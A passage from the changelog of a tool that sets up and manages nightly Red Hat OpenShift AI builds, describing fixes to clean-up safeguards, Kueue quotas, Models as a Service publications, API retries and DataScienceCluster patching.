    every node rolled out and drained. Confirming then said "Nothing to
    change". If you opened that review and still want the mirror, set it up
    again; nightly installs and updates need it.
  - **Model setup run again (v3.0.0 to v5.0.0-alpha.2):** setting up a
    model that already existed deleted its token Secret in the check step
    and still reported success, which invalidated the model's token (the
    next setup made a new one). If you set up an existing model again, run
    its setup once more and use the new token; tokens copied before no
    longer work.
  - **Hard reset (v4.0.0 to v5.0.0-alpha.2):** the DataScienceCluster was
    deleted in the first check, before the new spec's dry run, the module
    operator check and the record **Finish the hard reset** needs. A later
    refusal, or the DSC gone before the real delete, left the cluster with
    no DataScienceCluster and a message saying nothing was changed; create
    it again with Create DataScienceCluster or `oc create`.
  - **Remove the old tier policies (v3.0.0 to v5.0.0-alpha.2) and the
    Diagnostics fix that recreates a leftover workload (v4.0.0 to
    v5.0.0-alpha.2):** the outcome was the one asked for, but the check
    deleted already, so a later refusal said "Nothing was deleted" after a
    delete, and the fix said the workload "no longer exists" and wrote no
    activity entry.

  The dry run is now in the DeleteOptions, and the client does not send a
  delete with DeleteOptions in its body and any of them (`dryRun`,
  `propagationPolicy`, `gracePeriodSeconds`, `orphanDependents`) in its
  query; its message says the updater refused to send it.
- **Answering a refusal at once is no longer rate limited.** A streamed
  change the server refused without changing anything (Clean up asking to
  confirm a project's contents or a pipeline server's workbenches, a failed
  check) used the user's 30-second slot, so confirming within 30 seconds got
  "Not started: wait before repeating this change". A change that did not go
  through now gives the slot back only when it sent nothing that may have
  changed the cluster; one that changed something first, then failed or
  crashed, keeps it (a failed change that is not streamed gave it back).
  Reads sent as writes (IAM List actions, dry runs, access reviews) and
  writes the API server refused before applying them do not count; a
  delete of a collection, whose items go one by one, does.
- **A recipe's Clean up no longer asks about its own playground and Ray
  samples.** Before it deletes the recipe's project, Clean up lists what
  the project holds that this tool did not create, and that list named
  what the recipe set up (seen live on RHOAI 3.7): the playground's
  database volume (`genai-pgvector-storage`) and the pods of
  `genai-pgvector` and `lsd-genai-playground`, and the head, worker and
  submitter pods of the distributed workloads setup's Ray samples.
  After the existing exclusions (the tool's label, objects being deleted,
  the labels of the tool's pipeline server and model pods), an object is
  now also left out when every owner reference of it leads, through its
  ReplicaSet and Deployment (or the RayJob submitter's Job), to something
  this tool owns: the playground's OGXServer when it is the one this tool
  recorded for the project (same UID), the tool's pipeline server, the
  tool's models, and the RayCluster and RayJob in the tool's record of
  the distributed workloads setup for this project. A reference is
  matched by kind and UID. When Clean up everything (or the recipe's
  Clean up with the distributed workloads part ticked) deletes one of
  these before the project, the check just before the project's delete
  still counts their pieces as the tool's while Kubernetes removes them:
  it uses the owners the first check found. Still listed: a playground
  reconfigured in Gen AI studio (a new OGXServer), an object that one of
  the exclusions does not cover and that has another owner, and the head
  and worker pods of the RayCluster KubeRay makes for the RayJob sample
  (`nightly-rayjob-<5 characters>`, until the job ends and it is removed;
  recognising them would need a new permission to read RayClusters). A
  read that fails still refuses the Clean up. No permission changed.
- **Leaving the Environment page keeps a run and its progress view.**
  Leaving the page while one of its runs went on (Set up MaaS, any Set up,
  Clean up, Migrate storage, Secure S3 storage) closed the run's connection
  to the server: **View progress** on the alert then opened only the
  server's latest step, without the step list and progress. A Set up of
  several parts also judged its waiting part on the status the page last
  read, so it never saw the part work and did not set up the parts after
  it. The runs and their dialogs now belong to the app, not to the page:
  **View progress** opens the same dialog, with its steps, from any page; a
  Set up reads the status itself while the page is closed, no more often
  than the page would, and stops if your session ended; a run that ends
  with its dialog closed shows its outcome where you are, with **Show
  details** (now also Migrate storage, Delete the old storage and Secure S3
  storage); a Clean up that needs your confirmation says so, with **Open
  Clean up**; and the page takes the run up again when you come back,
  without starting a second one. While the run goes on, changes on other
  pages are off, also between the parts of a Set up. A confirmation open
  when you leave the page is cancelled. After a Set up of Pipelines, its
  **Open pipelines** opens the project it set up, not the one the tab shows
  now. A reload, another tab or another user still see the server's latest
  step.
- **A recipe sets up distributed workloads before its workbench and model
  when the project will be Kueue's.** It decided from its own opt-in, and
  only for the workbench: with the dashboard's Kueue setting on (an admin's)
  and no `kueue.dashboardOptIn`, or after a Clean up of the project, the
  workbench step failed ("no enabled workbench hardware profile sends
  workloads to a LocalQueue the project has", live on RHOAI 3.7.0-ea.1), and
  the model ran before Kueue without a hardware profile, around Kueue's
  queue and quota. Now, when the recipe has distributed workloads and the
  dashboard's setting is on at review time or turned on by its opt-in (the
  dashboard then offers a workload in the labelled project only a Queue
  hardware profile of a LocalQueue it has), What distributed workloads need
  and Distributed workloads run right after What the features need, before
  every lane, as the documented order has it; otherwise the order is as
  before. The model gets the Queue hardware profile as the dashboard's deploy
  form would (the tool's profile now allows up to 4 CPUs and 14 GiB, the
  largest catalog model), RHOAI gives it the queue label and Kueue admits
  it within the quota. The Models tab and the model step refuse a model in
  a Kueue project without such a profile (or one Kueue is off for in the
  dashboard) instead of deploying it without one. The review refuses, before
  anything runs, a workbench or model the dashboard would offer no usable
  profile, and says what to change in the recipe (on a fresh cluster,
  where the RHOAI step installs the dashboard, when the run gets there), and
  again the Workbench tab's own preflight (no image, no hardware profile)
  when no step before the workbench changes it. The review and the Kueue
  step no longer say the dashboard will mark the workbench as bypassing
  Kueue: the recipe no longer creates such a workbench.
- **Distributed workloads say up front when RHOAI makes its own LocalQueue.**
  With the DataScienceCluster's `kueue.autoCreateQueues` on (off by
  default), RHOAI creates a LocalQueue named `default` in every labelled
  project, which Set up refuses: a recipe's Kueue step stopped halfway, and
  every later Set up refused. The tab's Set up and the recipe's review now
  refuse before anything is labelled, and say what to change; the same
  when the queue's name is `nightly-kueue`, the tool's own.
- **The Kueue quota holds a workbench and a model on the Queue profile.**
  The ClusterQueue's 19 GiB did not count the workbench's kube-rbac-proxy
  sidecar (100m CPU, 64 MiB requested) nor a model. New setups get 14 CPUs,
  44 GiB and 12 GiB of ephemeral storage: both samples, a workbench and the
  largest catalog model twice (the documented example ClusterQueue has 9
  CPUs and 36 GiB). The model counts twice because a changed model setup
  rolls out a second pod (the Deployment's default `maxSurge`) that Kueue
  admits on its own while the first still serves; with room for one model
  only, it stayed `SchedulingGated` while the samples ran. The workbench's
  StatefulSet replaces its pod in place and needs no such room. Ephemeral
  storage is covered because the model requests it for its download, and
  Kueue does not admit a workload that requests a resource its ClusterQueue
  does not cover. Set up keeps a ClusterQueue that is there: an earlier one,
  also the 10 CPUs, 32 GiB and 6 GiB of builds after 5.0.0-alpha.2, reads
  "Made by an earlier version of this tool", and a recipe's Distributed
  workloads step stops on it; Clean up, then Set up, or give it the new
  quota in place ([RUNBOOK](RUNBOOK.md#107-distributed-workloads-kueue)).
- **Distributed workloads set up and clean up again in a project deleted
  and made again.** After a recipe's Clean up of its project only, the next
  Set up refused with "Clean up first", and Clean up stopped at a LocalQueue
  or sample of the tool's names in the new project, so the tool's
  ClusterQueue and ResourceFlavor stayed. Set up, Clean up and deleting a
  sample now forget that project's LocalQueue, sample and label entries
  (deleting the project deleted those), keep the cluster-wide queues, and
  treat same-named objects in the new project as someone else's: Set up
  refuses them, Clean up leaves them, and one that uses the tool's
  ClusterQueue keeps it. A label someone else set is never claimed or
  removed. When the project cannot be read, Clean up deletes nothing.
  Deleting a sample of a project deleted or made again since says so and
  deletes nothing (it no longer claims the sample is gone). The tab's
  status says "Project recipe-dev is gone; set up again" (or that it was
  made again, and then offers Set up) instead of "Incomplete" and "Not
  created yet", and while the
  project cannot be read it shows its LocalQueue and samples as unknown,
  not as the tool's.
- **The Distributed workloads tab can turn Kueue back.** Once its setup
  was cleaned up, the prerequisites still read "kueue Unmanaged (turned on
  by this tool)", but only Clean up everything could turn it back. The
  Kueue part now offers **Turn back** while this tool still owns the
  setting, with Clean up's confirmation words and Clean up's own request and
  checks. While a ClusterQueue or LocalQueue is on the cluster (the status
  now lists them), or they cannot be read, it is off and says why.
- **A recipe's Clean up says everything it leaves in place.** "Left in
  place" named only the S3 storage and MLflow. It now also lists the
  inference gateway the run's model used (Clean up everything deletes it),
  and the shared pieces the run's features installed or used, which no
  Clean up removes: Connectivity Link with its Kuadrant instance (and
  Authorino TLS with MaaS), the CloudNativePG operator (a MaaS CloudNativePG
  database), cert-manager (models, distributed workloads), the Red Hat
  build of Kueue, and GatewayClass `openshift-default` (MaaS). Only what the
  run's steps installed or used is listed: the operators once its
  prerequisites step is done (set up, or already set up, as after a Stop
  and Resume; also when a later step failed), MaaS's pieces once its MaaS
  step is, the inference gateway once its model step is.
- **The app no longer sends you to files of its repository.** The recipe
  review's playground warning ended "SECURITY.md (Which token is used where)
  says where your sign-in goes" (dropped), and the gitops profile's
  messages, banners and Diagnostics fix named `docs/GITOPS.md`, the upgrade
  banners `docs/UPGRADING.md`, and the gitops profile's missing image mirror
  `docs/QUICKSTART.md`: they now link those guides on the public GitHub
  mirror, at the section they mean, of the running release (its tag; `main`
  for a development build).
- **The Distributed workloads tab names the dashboard's pages as the
  dashboard does.** Its texts sent you to the dashboard's "Distributed
  workloads" page; on RHOAI 3.6 and 3.7 that page is **Workload metrics**
  under **Observe & monitor** (RayJobs also show on **Infrastructure**,
  Workloads tab). The tab, its link, the Overview, the recipe form and Clean
  up now say so.
- **A new workbench no longer gets a deprecated image.** RHOAI 3.7 marks
  most workbench images deprecated (the dashboard labels them Deprecated:
  they get no new versions), including Jupyter Minimal, whose tag still
  carries RHOAI's `default-image` mark, so the Workbench tab and a recipe
  set workbenches up on it. Set up now picks RHOAI's own images that are not
  deprecated first (on 3.7 Jupyter | CPU, the first in the dashboard's image
  list), then custom images (an admin's custom image is not known to work as
  a workbench), and a deprecated one only when no current image is ready:
  the Workbench tab labels it Deprecated, and the result says why. RHOAI 3.6
  keeps Jupyter Minimal. A workbench already set up keeps its image; the tab
  labels it Deprecated when its image is, as the dashboard's table does.
- **A recipe's Clean up offers to turn the DataScienceCluster's `kueue`
  back.** Clean up what the recipe set up kept a component only while it
  read `Managed`, so `kueue`, which a run turns on as `Unmanaged`, was never
  offered (its Distributed workloads prerequisites step did not read as
  created either). The recipe's offer, the Environment tabs' offer and Clean
  up itself now make one check: the component is in its own on state and
  this tool's field manager still owns it. Set up now gives each time it
  turns a component on its own ID in its record; a run keeps the ID its step
  turned on and claims only that one, and its Clean up names it, checked
  again under the cluster lock right before the component goes back. So a
  component turned back and turned on again (from the Environment tab, by
  another run, even in the same second, or while the dialog was open) is not
  turned back for an old run ("turned on again since you reviewed this Clean
  up"). Runs and records from before the ID match as before; such a
  component is named `none` in the request and is not turned back once its
  record entry has an ID, and a recipe's Clean up turns back no component it
  does not name. The dialog says
  that Kueue goes back last, only once no ClusterQueue or LocalQueue is left
  on the cluster, and sends only the components it says go back: one it
  lists as staying on is not turned back by the server either. KServe is
  listed as staying on for a model the Environment status shows in a project
  that stays, not because the recipe has a model (one that failed or was
  deleted no longer keeps it on). Clean up's messages
  about a component that is not turned back no longer call it `Managed`
  (`Not turned back: kueue (in use: ...)`, `... so it stays Unmanaged`).
- **The recipe's Clean up dialog names RHOAI 3.6's components.** It listed
  `aiHub` and `ogx` by their keys; they now read AI hub and OGX. AI hub stays
  on while the model registry stays, as `modelregistry` does (Clean up keeps
  it while a registry is left), and turning it back says that it also
  removes the Model Catalog, as the Environment page's Clean up does.
- **The API client retries when the API server asks it to.** Right after
  Connectivity Link was installed, Set up's wait for Kuadrant's API stopped
  after 21 seconds on `429 TooManyRequests: storage is (re)initializing`, the
  API server's answer while a new CRD's watch cache initializes, and said the
  API "is not served after 10:00". The client now retries as client-go does: a
  429 or 5xx that carries `Retry-After` in seconds is sent again after that
  many seconds, at most 10 times (a 5xx only for a read: a write may have been
  applied), and the waits of one request add up to at most 32 seconds (the
  largest wait the API server asks for). Versioned RHOAI reads and Diagnostics
  still take a conversion failure, which never clears, at once. The check
  whether Kuadrant's API is served lists with `limit=1`, which the API server
  serves from etcd while the new CRD's watch cache initializes, and the waits
  for Kuadrant's and CloudNativePG's APIs treat a 429 that outlasts the
  retries as "not served yet" and poll on. A wait that another read error
  ends now says `Stopped waiting for ... after <m:ss>: <error>` instead of
  claiming the whole timeout. Errors of a throttled request carry errorCode
  `rate_limited`. See [RUNBOOK §11.10](RUNBOOK.md#1110-the-api-server-asks-to-retry-429-retry-after).

- **A fresh Connectivity Link install no longer leaves Kuadrant stuck
  without Authorino and Limitador.** Set up (the MaaS tab, and models'
  prerequisites through a gateway) created the Kuadrant CR as soon as its API
  was served. For up to 30 seconds after a CRD is Established, the API server
  refuses objects owned by its CRs with `blockOwnerDeletion` (its admission
  RESTMapper is reset every 30 seconds), so Kuadrant's operator failed to
  create Authorino and Limitador. It retries such errors, but can drop its
  own retry (Kuadrant/kuadrant-operator#2102), and Kuadrant then stays not
  Ready ("limitador resource not in topology") until its operator restarts.
  Set up now waits until 45 seconds after CRD `kuadrants.kuadrant.io` turned
  Established, by the API server's clock, before it creates the CR (no wait
  for an older CRD; a CRD not Established yet is read again for up to 30
  seconds), and stops without creating it when the CRD cannot be read or does
  not turn Established. When Kuadrant is not Ready after 5 minutes and has
  not made Authorino, Set up stops there instead of going on to the database
  and the gateway and waiting for Authorino as long again. Its message, and
  the Authorino TLS step's (also when the operation ends while it waits),
  gives what the wait found (not the wait's own deadline) and quotes
  Kuadrant's Ready condition; when Kuadrant reports Authorino or Limitador
  missing from its topology, it says that a cluster-admin can restart
  Kuadrant's operator (`oc rollout restart
  deployment/kuadrant-operator-controller-manager -n <namespace>`); the tool
  restarts nothing itself. No new permission: the CRD is read from the
  cluster-wide CRD list, by name, which the tool already reads.

- **Workbenches start on ROSA HCP.** A workbench pulls its image through the
  internal registry (`image-registry.openshift-image-registry.svc:5000/<applications namespace>/<image>:<tag>`,
  as the dashboard writes it), whose pull-through follows the image mirror to
  `quay.io/rhoai` but never sees `kube-system/additional-pull-secret`: on a
  hosted control plane that Secret reaches the nodes only. So every
  workbench, made by this tool or in the RHOAI dashboard, stayed in
  `ImagePullBackOff`. On ROSA HCP the tool now also writes Secret
  `rhoai-nightly-updater-pull` (only an exact `quay.io/rhoai` entry, never a
  generic `quay.io` login; labelled as the tool's) into RHOAI's applications
  namespace, which it reads from the DSCInitialization: when the pull secret
  is saved, and after Update (also under Argo CD), Reinstall, Refresh,
  creating the DataScienceCluster and setting up a workbench (a fresh cluster
  has no applications namespace when the pull secret is saved). The
  **Pull secret** item says whether the internal registry can pull nightly
  images and offers **Copy for the internal registry** and **Remove the
  internal registry's copy**. A Secret of that name the tool did not create
  is never changed or removed. Self-managed clusters are unchanged (their
  registry uses `openshift-config/pull-secret`); the gitops profile reads no
  Secret, so it documents an `oc` command instead
  ([GITOPS](docs/GITOPS.md#workbench-images-on-rosa-hcp)).

- **A recipe's playground works when its model is offered only through
  Models as a Service.** Publishing the model through MaaS (or reaching it
  through MaaS) takes it out of the dashboard's Gen AI assets, so the
  playground offers it only as a Models as a Service model, and the
  Playground step stopped with "has no ready chat model". The step now sets
  the playground up with that model's Models as a Service entry (found from
  its MaaSModelRef), and fails with the reason when it is missing or not
  ready; a ready playground of this tool counts as done, since the
  playground offers each user's Models as a Service models per request.
  The recipe form and the review say so. The Playground tab's
  set-up confirmation names models by their display names, and the tab says
  which models Set up chose (the tool now records them) and that the
  playground offers the project's own ready models and the Models as a
  Service models each user's subscriptions allow.

- **The Ray samples' head no longer runs out of memory.** In the 5.0.0
  pre-releases the samples' head and worker had 1 CPU and 2 GiB (requests
  equal to limits), and the head was OOMKilled seconds after it started. They
  now use the CodeFlare SDK's defaults (above), and the ClusterQueue quota
  grows from 6 CPUs / 11 GiB to 6 CPUs / 19 GiB to hold them. Set up keeps
  what is there, so the Distributed workloads tab now shows the live
  ClusterQueue's quota and flags a queue or sample an earlier version made
  with other sizes, and a recipe no longer counts those as set up: Clean
  up, then Set up.

- **Deleting a pipeline server no longer breaks the workbenches that use its
  dashboard Connection.** A workbench a user attached
  `rhoai-nightly-updater-s3` to in the dashboard kept naming it after the
  pipeline server (and with it the Connection) was deleted, and the
  workbenches webhook then refused every update of it, Stop and Start
  included. Delete, Recreate and Clean up now take the Connection off the
  workbenches that name it in `opendatahub.io/connections` first (only that
  entry; the others stay; running workbenches restart, so work not saved to
  disk is lost), after you confirm each one: the confirmation lists them, a
  workbench that started using it since (checked again right before the
  delete), or was made again under the same name, refuses the request before
  anything is deleted, and a failed change stops before anything is deleted. The
  Pipelines tab names the workbenches that use the Connection. Every change
  is tried as a dry run first, and a workbench the webhook refuses (another
  of its Connections is gone) is named with the webhook's reason.
  Workbenches that load the Connection without the annotation (attached by
  RHOAI 2.x) are listed but not changed: they fail to start after the
  deletion until you remove it from them in the dashboard. New
  permission used with your own token: `patch` on Notebooks.

- **A recipe project's Clean up deletes the project you reviewed, and a
  second confirmation no longer loses the first.** A dialog left open while
  its project was deleted and a recipe made it again deleted the new
  project; the request now carries the UID shown (`recipeProjectUIDs`,
  required), and Clean up refuses, before anything runs, a project made
  again since. A refusal to confirm a project's contents now lists all of
  them for every project that holds any, so a project whose contents were
  all confirmed is no longer refused again on the retry.

- **Recipe projects follow the cluster.** The Recipes page lists every
  project recipes created that the cluster still has (not only the last
  run's), and Clean up everything on the Environment page offers them, each
  deleted with the same guards (recorded UID, the tool's label and the
  recipe annotation, and the confirmation of what it holds that the tool did
  not create, per project). The background check forgets a recorded recipe
  project once its namespace is gone. The Recipes page reads the run every
  15 seconds while it is visible, so a run resumed elsewhere shows without a
  reload. A clean-up's result says what each part did ("Kept Managed:
  aipipelines (this tool did not turn it on).") instead of "Deleted" for what
  it kept, and the recipe Clean up no longer reads "Deleted the 0 parts".
  The clean-up request takes `recipeProjects` (a list) and
  `confirmProjectContents` per project.

- **A MaaSModelRef deleted outside this tool no longer leaves a "Partly
  published" row and a Failed subscription.** Publish routes the model
  through `maas-default-gateway` alone, so after `oc delete maasmodelref`
  the background check never took the publication for gone: the tab asked
  to Unpublish, and the subscription and access policy kept listing the
  missing reference, which MaaS marks Failed for every published model.
  The background check now takes the model out of the subscription, the
  access policy and the gateway's projects, and the record keeps only what
  restoring its routing writes back. The row, from the live model, reads
  "No MaaS reference; the model still routes through the MaaS gateway, so
  its direct address does not answer." with **Restore direct routing**,
  which puts back its gateways and Gen AI studio label with your token.
  Delete model and Clean up MaaS also work in this state.
- **A published model in a project being deleted reads "Being removed
  with its project".** For about 45 seconds the row showed "Published;
  waiting" with Unpublish and Change limit, because the background check
  empties the record within a second and the row then followed the
  MaaSModelRef that is deleted with the project. The row now follows the
  project (or the model) being deleted, whatever the record says.
- **A deleted project this tool added to the inference gateway reads as
  this tool's.** When the project's namespace UID was recorded and the
  project had been deleted, the Models tab said "this tool did not add
  it". It now says the next Models change removes it, as it does; a
  project made again under the name (another UID) is still not the tool's
  entry. The other line now reads "this tool has no record that it added
  it".
- **The Environment page reads its status one request at a time.** After
  quick polling had stopped at 10 minutes, a later change that started
  settling again ran the quick polling beside the 45-second re-read, so two
  status requests could run at once, and the page said at once that it had
  stopped checking. One poller now does both: each settling period polls
  quickly again for its own 10 minutes, and a read still running is waited
  for.
- **Clean up confirms only the pipeline servers you ticked.** A refresh
  while the Clean up dialog was open could turn a ticked pipeline server
  into one this tool has no record of, and the dialog then sent it as
  confirmed by you. The dialog now unticks such a server, and a
  confirmation names the server's UID: Delete, Recreate and Clean up skip
  the record check only for that server, so one deleted and made again
  since is refused.
- **An Unpublish that failed on the model's Gen AI studio label is
  finished by Unpublish again.** When Unpublish routed the model back but
  could not put back its `opendatahub.io/genai-asset` label and
  `opendatahub.io/genai-use-case` annotation, the background check took the
  publication for gone and dropped what Unpublish had to put back, so the
  model stayed out of Gen AI studio's AI assets. The publication now stays
  while the tool's model still lacks them: the row reads Partly published
  and offers Unpublish, which puts them back.
- **The MaaS tab shows what is on the cluster, not this tool's record.**
  A project deleted while its model was published left a "Needs attention:
  Partly published ... this tool's record of the publication still in
  place. Unpublish to finish removing it" row, built from the record alone,
  and the Unpublish dialog said the model keeps running. Such a publication
  now has no row: the tab names it as being removed automatically (the
  background check removes what is left) and shows a problem only when
  that removal failed, with its error. A project being deleted shows its
  model as being removed, with no buttons. A publication only the record
  still lists is "Not published" (Publish is offered), and the Models
  tab's teardown no longer refuses such a model.
- **Gone MaaS publications are removed within seconds of opening the
  tab.** A MaaS status read that finds a publication whose project or model
  is gone starts the background check at once instead of waiting up to
  five minutes: in the background (the read does not wait), under the same
  cluster lock and cross-pod lease, at most one per minute, and never in
  the gitops profile.
- **A deleted MaaS project no longer keeps MaaS from being turned off.**
  The Components page's MaaS guard counted the publications in this tool's
  record, so one whose project was gone still blocked removing
  `aigateway.modelsAsAService`. It now counts the MaaSModelRefs on the
  cluster (anyone's) and this tool's platform setup only.
- **The MaaS gateway admits only projects with a publication on the
  cluster.** Set up, Publish, Unpublish and the background check wrote
  `maas-default-gateway`'s list of projects from this tool's record, so a
  publication only the record still listed kept (or put back) its project
  on the gateway, whose editors could then attach routes to it. The list
  is now the projects of this tool's MaaSModelRefs on the cluster.
- **The MaaS tab's DataScienceCluster part is this tool's only while it
  owns the field.** It said "set up by this tool" from the record alone,
  also after someone else set `modelsAsAService` or `aigateway`. As for the
  prerequisites, the part (and the platform) now counts as this tool's
  only while the record says it changed the field and its field manager
  still owns it.
- **A MaaS publication belongs to the model it published.** Publish now
  records the model's UID with the gateways and Gen AI metadata Unpublish
  writes back. A model deleted and made again under its name, also by this
  tool, is not the published one: its old publication is removed
  automatically, and the old values are never written to the new model.
- **The records forget projects that are gone.** The background check
  (at start and every five minutes) now also drops the entries of the
  models, pipeline server and playground records whose project no longer
  exists; they only piled up. An entry is kept while its project exists, is
  being deleted or cannot be read, and a model's while its MaaS publication
  is still recorded.
- **The nodes' pull secret card says what it knows.** "Entry set by: This
  tool" came from this tool's record alone: the updater may not read
  `openshift-config/pull-secret` (SECURITY.md). The card now says the entry
  is recorded as added by this tool and that Add and Remove check it with
  your permissions before they change anything.
- **A MaaS publication of which nothing is left is dropped.** When the
  project and model are still there but the MaaSModelRef is gone and the
  model no longer routes through the MaaS gateway (the reference deleted
  outside this tool, or a publish that stopped before it), the publication
  stayed in this tool's record for good. It is now named as being removed
  and the background check drops it (and its subscription entry); the
  model's row is "Not published".
- **"Through MaaS only" belongs to the model that was published.** The
  Models tab's "Through MaaS only" and the unpublish step of its Delete
  came from the MaaS record by name, so a model made again under the name
  before the background check ran inherited them. They now count only for
  the model whose UID the publication recorded.
- **Delete model names a MaaSModelRef someone else made.** It said
  "Unpublish it on the MaaS tab first", but the MaaS tab leaves such a
  reference alone and offers no Unpublish. Delete still refuses (the
  reference would point at nothing), and now says the reference is not
  this tool's and whoever made it removes it.
- **A pipeline server this tool has no record of is deleted only when you
  confirm it.** Delete and Clean up took a pipeline server with this tool's
  label as the tool's, although a project editor can set that label (or
  make the server again under its name). One whose UID this tool did not
  record (set up before 3.0.1, or labelled by someone else) is now deleted
  only when you confirm it: the Delete and Recreate dialogs say so, and
  Clean up lists it unticked with the reason. The server refuses without
  the confirmation, and also while it cannot read its record.
- **This tool's pipeline servers and models in a project that is no longer
  a Data Science project are shown.** Once the RHOAI dashboard's label was
  removed from a project, the project picker dropped it, and this tool's
  pipeline server and models there vanished from the page while still
  using the S3 storage and the inference gateway; Clean up then called the
  pipeline server one "this tool did not create". The Pipelines and Models
  tabs now name them ("no longer a data science project") with Delete, and
  Clean up offers them as this tool's.
- **The Environment page follows the cluster on its own.** Once nothing
  was starting or being deleted, the page never read the cluster again
  until you clicked Refresh, so something deleted elsewhere kept its row and
  its Delete and Clean up buttons. The status, MaaS and the prerequisites
  are now read again every 45 seconds while the browser tab is visible
  (never while it is hidden, at once when you come back, one read at a
  time), and opening Clean up reads the status again before it lists what
  goes.
- **A deleted project on the inference gateway's list is no longer a
  warning.** The Models tab showed it as "deleted — Remove" in a warning
  that asked you to confirm its removal. A project this tool added is
  already taken off the list at the next Models change or Clean up; the
  tab now says so on a plain line ("Project X no longer exists; it is
  removed from the gateway at the next Models change", or that this tool
  did not add it), with a Remove that runs at once, with your sign-in.
- **A playground made later is not taken for this tool's.** When this
  tool's record of a playground had no server UID yet (the install never
  confirmed one), any playground created after the request counted as the
  tool's, so one someone made in that project days later was offered to
  Clean up. That rule now holds only within the install's own window (its
  retries and its wait, 9 minutes); past it the playground is not this
  tool's and the next playground operation drops the record.
- **A project made again is not the one this tool added to the inference
  gateway.** The record of the projects this tool added to the gateway's
  list held names only, so a project deleted and created again under the
  name (and put on the list by someone else) counted as the tool's: the
  Delete dialog said deleting the last model takes it off the list, and the
  teardown did. The record now keeps each project's namespace UID; a
  project with another UID is not the tool's entry, is never taken off by
  it, and is dropped from the record. Entries recorded by earlier versions
  keep their name-only meaning.
- **Delete S3 storage is offered for what is on the cluster.** After a
  deletion that did not finish, Delete stayed offered because this browser
  remembered the failure: in another browser it was gone, and here it
  stayed even with nothing left. The status now names this tool's storage
  objects a deletion left (its Secret, Service and NetworkPolicy, besides
  the data volume and the Route), and Delete is offered while they are
  there.
- **A DataScienceCluster change applies only to the DSC it was checked
  on.** The Components page's changes (a component's state, Fix, soft
  reset) and Diagnostics' disable-component fix tested only the fields
  they change, so a DSC deleted and created again with the same name, or
  changed elsewhere after the removal checks ran, was still patched. The
  JSON Patch now also tests the DSC's uid and resourceVersion (the read
  every check was made on). The operator's status writes move the
  resourceVersion too, so when the patch finds the DSC changed (nothing
  was changed), the DSC is read again and the whole change is checked
  again on that read (the removal preconditions, and for a reviewed change
  its plan) before the next patch, at most 3 patches and only on the same
  DSC (uid); a check that now fails stops it, and a read that fails says
  that nothing was changed. This was the unmerged October fix for the
  disable-component fix, carried over to the rework. The API server
  answers a failed `test` with a bare 422 ("the server rejected our
  request due to an error in our request", no cause; kube-apiserver
  `applyJSPatch`), so the tool reads the DSC again after a 422 to tell
  them apart: a moved resourceVersion is checked again as above, an
  unchanged one is the API server's own refusal (a validation rule, the
  operator's webhook), shown as before. Diagnostics' stored field types
  fix now tells a changed object from a refusal the same way (it
  reported a changed object as "The API server refused the change"),
  and the hard reset says the DSC was deleted or created again instead
  of "refused the release default" when the uid test of its dry run
  fails.

- **IPv6 clusters.** The API server address was built as
  `https://<KUBERNETES_SERVICE_HOST>:<port>`, which is not a valid URL when
  the host is an IPv6 address (IPv6 or IPv6-primary dual-stack clusters),
  so every call failed. The address is now bracketed (`https://[fd02::1]:443`),
  as client-go does.

- **Update under Argo CD refuses when it cannot read OLM's progress.** The
  check that keeps Update from deleting a Subscription OLM is still
  installing took a Subscription or InstallPlan it could not parse for
  "nothing pending". It now refuses with "Nothing was changed".

- **A component that serves a CRD conversion webhook can be set to
  Removed again when that CRD holds no objects.** Setting
  `mcplifecycleoperator` (or any component whose Service converts a CRD)
  to Removed was always refused with "This tool cannot list those objects": the check
  was written when every read used the ServiceAccount, which may not read
  arbitrary kinds. Since 4.0.0 the plan and the change carry the signed-in
  cluster-admin's own token, so the check now lists each such CRD's objects
  in every namespace with that token, at the CRD's storage version, one
  page of 20. With none, this check no longer blocks (the other removal
  checks still run). With some, the refusal says how many ("4", or "20 or
  more" when the API server has more), names up to five
  (`namespace/name`) and gives the `oc delete` command; the removal stays
  refused until none remain. A list that fails (403, a conversion error, a
  timeout) or a request without the user's sign-in still refuses, with the
  error and the `oc get <crd> -A` command. Only a list of the CRD's objects
  is taken for "none": an answer from the API server that is not one (no
  `items`, `items: null`, or another kind than the CRD's own list kind,
  such as a `Status`) refuses the same way, since every Kubernetes list
  carries `items`. The Components page's repair
  preview (`GET /api/components`, admin-only) now also carries the
  signed-in cluster-admin's own client in the full profile, as the plan
  does, so it runs the same check and no longer blocks a "Reset to
  defaults" or "Remove extra components" repair that removes such a
  component while its CRD holds no objects. The gitops profile never acts
  with the user's token, so its preview still refuses. The ServiceAccount
  gains no permission
  ([RUNBOOK §11.9](RUNBOOK.md#119-change-or-reset-the-datasciencecluster)).
- **A failed DataScienceCluster repair names the real reason.** Every error
  of `POST /api/components/dsc/repair` was answered 422 `validation`: a
  DataScienceCluster that changed since it was read (the API server's 409),
  an ended sign-in (401), a refusal by the user's RBAC (403) and an
  unreachable API all read as "validation". They are now 409 `conflict`,
  401 `session_expired`, 403 `forbidden` and 502 `network` (or the status
  of the API server's answer); the repair's own refusals ("refresh and
  review again") stay 422 `validation`. The other changes whose errors were
  a bare 500 `internal` with no reason (MLflow, pipeline servers, the S3
  storage, Dashboard Dev, the pull secret, the node pull check, assist
  rollout, Diagnostics fixes, the update dry run, creating the
  DataScienceCluster) answer the same way, and five reads (activity,
  Diagnostics, Environment status, the pull secret test, node
  verification) answer with the status and errorCode of their error. The
  UI titles a 409 `conflict` "The object changed in the meantime", not
  "Cluster busy".
- **An operation that crashes on a bug ends cleanly.** A panic in one of
  the 13 streamed operations (update, install, refresh, the DSC hard reset,
  node setup, storage migration, models, MaaS, the playground, MLflow
  samples, prerequisites, clean up) was logged without its stack, the
  stream ended without a final event (the UI waited, then fell back to
  polling) and the user's 30-second slot stayed taken; the update dry run
  answered an empty 200. Every stream now runs through one helper that
  logs the panic with its stack, ends the stream with a failed result
  ("stopped on an internal error ... check what it changed"), and gives
  the slot back; the dry run answers 500 `internal`.
- **Dashboard Dev no longer reports the dashboard ready with one of its
  pods missing.** With `spec.replicas: 2` and only one pod (the second not
  created, for example refused by a quota), the dashboard state said
  ready and not rolling out. Fewer pods than the Deployment asks for is now
  "Rolling out", as `kubectl rollout status` treats it.
- **An API response over 50 MiB says so.** The updater reads at most
  50 MiB of one API server response; a larger one came back cut and
  failed later as "unexpected end of JSON input". It is now an error that
  names the request and the limit. The Quay token response is read with a
  1 MiB bound like every other external read, and the three admin reads
  (DSC plan, S3 credentials, MaaS groups) check the user's permission once
  per request instead of twice.
- **An operation whose lease renewals fail stops 10 s before another pod
  may take over.** The holder judged its renewals only when one returned,
  and counted from when the last successful write returned, not from the
